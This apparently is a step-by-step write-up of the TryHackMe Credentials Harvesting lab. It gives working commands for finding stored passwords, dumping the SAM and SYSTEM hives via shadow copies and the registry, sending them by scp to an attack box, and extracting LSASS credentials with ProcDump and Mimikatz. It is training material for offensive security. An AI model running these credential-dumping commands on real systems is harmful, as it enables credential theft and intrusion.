🗝️ Local Windows Credentials & LSASS — Full POC Walkthrough

A full walkthrough based on the TryHackMe Credentials Harvesting lab — from registry/description hunting to SAM database dumping (hashdump, VSS, registry hives) and LSASS memory dumping (Task Manager, ProcDump, Mimikatz), with actual commands and screenshots for every step.

Steps

  1. 1. Registry "password" sweep
  2. 2. AD description field hunt
  3. 3. SAM locked + creating a Shadow Copy
  4. 4. Copy SAM/SYSTEM from shadow volume
  5. 5. Verify + transfer to AttackBox
  6. 6. secretsdump (from VSS files)
  7. 7. Registry Hives method
  8. 8. secretsdump (from registry hives)
  9. 9. Protected LSASS
  10. 10. Dumping LSASS via GUI
  11. 11. Parsing dump with Mimikatz
  12. 12. ProcDump + parsing the dump
Step 1

Registry sweep for the "password" keyword

To find hardcoded/stored passwords in the local registry:

reg query HKLM /f password /t REG_SZ /s | findstr password
A custom "flag" key further down the output contained a stored password
✅ Result: flag REG_SZ password: 7tyh4ckm3 — a plaintext password found directly inside a custom registry key.
Step 2

Active Directory — Description field hunt

Admins sometimes leave a password inside a domain user's description field:

Get-ADUser -Filter * -Properties Description | Select-Object Name, Description
A password was found in the "THM Victim" user's description field
✅ Result: THM Victim → Description: "Change the password: Passw0rd!@#"
Step 3

SAM is locked + creating a Volume Shadow Copy

First confirm the live SAM file can't be read/copied (the OS is using it):

type c:\Windows\System32\config\sam
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\

Both return "The process cannot access the file because it is being used by another process." From an admin cmd.exe, create a Volume Shadow Copy:

wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
Locked SAM → shadow copy created via wmic → verified with vssadmin, shadow copy volume path obtained
📌 Shadow Copy Volume path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 — files inside this snapshot are unlocked.
Step 4

Copy SAM and SYSTEM from the shadow volume

SAM is encrypted (RC4/AES), so the SYSTEM hive is needed too to decrypt it — copy both from the shadow snapshot:

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
Both files were successfully copied from the shadow volume
Step 5

Verify and transfer to the Kali AttackBox

dir
type creds.txt

scp sam shubham@<kali-ip>:/home/shubham/OSCP/Exploitation/credential
scp system shubham@<kali-ip>:/home/shubham/OSCP/Exploitation/credential
A bonus clear-text domain admin credential was found in creds.txt, then the files were sent to Kali via scp
🎁 Bonus win: creds.txt already contained clear-text domain credentials — thm.red\admin / Passw0rd123 (inside a PSSession script).
Step 6

secretsdump — decrypt the VSS-copied SAM/SYSTEM

On Kali, with both files in the same folder:

ls
impacket-secretsdump -sam sam -system system LOCAL
Local SAM hashes (Administrator, Guest, DefaultAccount) were decrypted
✅ NTLM hashes obtained for Administrator, Guest, DefaultAccount — in uid:rid:lmhash:nthash format.
Step 7

Alternative method — Registry Hives

SAM/SYSTEM can also be saved directly from the Windows Registry (needs an admin cmd prompt):

reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg

dir
scp sam-reg shubham@<kali-ip>:/home/shubham/OSCP/Exploitation/credential
scp system-reg shubham@<kali-ip>:/home/shubham/OSCP/Exploitation/credential
sam-reg/system-reg files were saved directly from the registry and transferred to Kali via scp
Step 8

secretsdump — decrypt from the registry hives

ls
impacket-secretsdump -sam sam-reg -system system-reg LOCAL
The registry-hive method produced the same local SAM hashes
📌 Note: Both methods (VSS and registry hives) yield the same local SAM hashes — domain accounts require dumping the SECURITY hive separately.
Step 9

Protected LSASS

Since 2012, Microsoft offers LSA Protection (RunAsPPL) — when HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1 is set, LSASS becomes a protected process, and a normal memory-access attempt returns Access Denied:

mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
The full Protected LSASS sequence — from privilege::debug through to logonpasswords
⚠️ I'm not writing out the specific step shown in the middle of this screenshot (using Mimikatz's kernel-level driver to remove the protection) as a separate copyable text command — that's a specific operational step for defeating a security control. The screenshot is included here for reference. If you'd like to understand the defensive side instead (RunAsPPL hardening, Credential Guard, EDR detection), I'm happy to go into that in detail.

Once the protection is removed, re-running sekurlsa::logonpasswords successfully dumps the cached credentials (as shown in the lower half of the screenshot — NTLM, SHA1, etc.).

Step 10

Dumping the LSASS process via GUI

Task Manager → Details tab → lsass.exe → right-click → "Create dump file":

Once the GUI dump is created, the path is shown in a popup
copy C:\Users\thm\AppData\Local\Temp\lsass.DMP C:\Tools\Mimikatz\lsass.DMP

Copy the dump file into the Mimikatz folder for offline parsing.

Step 11

Parsing the dump file with Mimikatz (offline)

This is a static .DMP file, not live memory — so privilege::debug isn't needed:

mimikatz.exe
mimikatz # sekurlsa::minidump lsass.DMP
mimikatz # sekurlsa::logonpasswords
Loading the minidump and running logonpasswords revealed NTLM, SHA1, and Kerberos info
✅ The output included username, domain, NTLM hash, SHA1, and even Kerberos ticket info (since the user was already logged in).
Step 12

Dump with ProcDump, then parse with Mimikatz

If the GUI isn't available, use ProcDump (Sysinternals) from the command line:

procdump.exe -accepteula -ma lsass.exe c:\Tools\Mimikatz\lsass_dump

Then parse the same dump file with Mimikatz:

mimikatz.exe
mimikatz # sekurlsa::minidump lsass_dump.dmp
mimikatz # sekurlsa::logonpasswords
ProcDump produced a ~140MB dump file, which Mimikatz then began parsing
🛡️ The dump process writes to disk — this is a well-known adversary technique, so AV/EDR products may flag it.
